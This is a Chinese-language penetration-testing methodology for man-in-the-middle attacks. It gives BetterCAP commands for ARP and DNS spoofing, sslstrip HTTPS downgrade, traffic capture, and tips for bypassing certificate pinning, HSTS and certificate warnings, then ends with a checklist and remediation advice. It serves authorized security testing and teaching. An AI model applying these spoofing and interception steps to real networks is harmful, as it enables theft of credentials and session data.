# 中间人攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的中间人（MITM）攻击检测和利用流程。

## 1.2 适用范围

本文档适用于所有使用网络通信的 Web 应用、移动应用和 API 服务。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

中间人攻击是指攻击者秘密地中继并可能篡改两个通信方之间的通信。

**本质问题**：
- 缺少加密或加密强度不足
- 证书验证缺失或缺陷
- 网络层信任假设

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-300 | 中间人攻击 |
| CWE-295 | 证书验证不当 |
| CWE-319 | 敏感信息明文传输 |

## 2.2 攻击常见于哪些业务场景

| 场景 | 风险点 | 潜在危害 |
|-----|-------|---------|
| 公共 WiFi | 无加密通信 | 会话劫持、凭证窃取 |
| HTTP 网站 | 明文传输 | 数据窃听、篡改 |
| 证书验证缺失 | 自签名证书接受 | 流量劫持 |
| HSTS 缺失 | 协议降级 | HTTPS 降级为 HTTP |
| 移动应用 | 证书绑定缺失 | API 流量窃听 |

## 2.3 漏洞发现方法

### 2.3.1 网络环境检测

```bash
# 检测是否使用加密
curl -I http://target.com

# 检测证书有效性
openssl s_client -connect target.com:443

# 检测 HSTS 配置
curl -I https://target.com | grep -i strict
```

### 2.3.2 证书验证检测

```bash
# 检查证书链
openssl s_client -connect target.com:443 -showcerts

# 检查证书是否自签名
# 检查证书是否过期
# 检查域名是否匹配
```

### 2.3.3 工具检测

```bash
# 使用 BetterCAP
bettercap -iface eth0

# 使用 MITMf
mitmproxy

# 使用 Burp Suite
# 配置为系统代理
```

## 2.4 漏洞利用方法

### 2.4.1 ARP 欺骗

```bash
# 使用 BetterCAP
bettercap -iface eth0
> set arp.spoof.targets 192.168.1.100
> arp.spoof on

# 流量被重定向到攻击者
# 可以窃听和篡改
```

### 2.4.2 DNS 欺骗

```bash
# 使用 BetterCAP
> set dns.spoof.domains target.com
> set dns.spoof.address 192.168.1.100
> dns.spoof on

# 将 target.com 解析到攻击者控制的 IP
```

### 2.4.3 SSL 剥离

```bash
# 使用 sslstrip
sslstrip -l 8080 -a

# 将 HTTPS 链接降级为 HTTP
# 用户访问 https://target.com
# 实际被重定向到 http://target.com
```

### 2.4.4 流量窃听

```bash
# 使用 Wireshark 捕获流量
wireshark -i eth0

# 使用 tcpdump
tcpdump -i eth0 -w capture.pcap

# 分析 HTTP 流量中的敏感信息
# Cookie、凭证、个人数据
```

### 2.4.5 流量篡改

```bash
# 使用 Burp Suite 拦截和修改请求
# 使用 BetterCAP 注入 JavaScript
# 使用 MITMProxy 修改响应
```

## 2.5 漏洞利用绕过方法

### 2.5.1 证书锁定绕过

```bash
# 如果应用使用证书锁定
# 尝试：
# 1. 反编译应用修改锁定逻辑
# 2. 使用 Frida 动态插桩绕过
# 3. 寻找未锁定证书的场景
```

### 2.5.2 HSTS 绕过

```bash
# 首次访问前 HSTS 未生效
# 使用 sslstrip 拦截首次请求

# 使用相似域名
target.com → target0.com
```

### 2.5.3 证书警告绕过

```
用户行为利用：
- 用户通常会点击"继续访问"
- 用户不验证证书详情
- 用户对警告麻木
```

---

# 第三部分：附录

## 3.1 MITM 测试检查清单

```
□ 检测网络加密状态
□ 检测证书有效性
□ 检测证书验证逻辑
□ 测试 ARP 欺骗
□ 测试 DNS 欺骗
□ 测试 SSL 剥离
□ 测试 HSTS 绕过
□ 测试证书锁定绕过
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| BetterCAP | 网络攻击框架 | https://bettercap.org/ |
| MITMProxy | 代理工具 | https://mitmproxy.org/ |
| sslstrip | HTTPS 降级 | https://github.com/moxie0/sslstrip |
| Wireshark | 流量分析 | https://www.wireshark.org/ |
| Burp Suite | Web 代理 | https://portswigger.net/burp |

## 3.3 修复建议

1. **强制 HTTPS** - 使用 HSTS 强制加密
2. **证书验证** - 正确验证服务器证书
3. **证书锁定** - 移动应用实施证书锁定
4. **加密所有通信** - 包括内部网络

---

**参考资源**：
- [OWASP Cheat Sheet: Transport Layer Protection](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [BetterCAP Documentation](https://www.bettercap.org/docs/)
